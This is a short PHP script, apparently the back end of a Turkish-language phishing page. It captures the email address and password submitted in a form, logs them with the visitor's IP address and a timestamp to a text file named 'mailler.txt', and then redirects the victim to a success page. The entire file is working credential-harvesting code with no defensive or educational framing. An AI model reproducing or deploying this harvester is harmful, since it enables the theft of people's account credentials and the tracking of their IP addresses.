<?php
if($_POST){
$password =  $_POST['password'];
$mail =  $_POST['mail'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('mailler.txt', 'a'); 
fwrite($file, "-----Mail----->".$mail."-----Sifre-----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file);
header("Location:success.php");
}
?>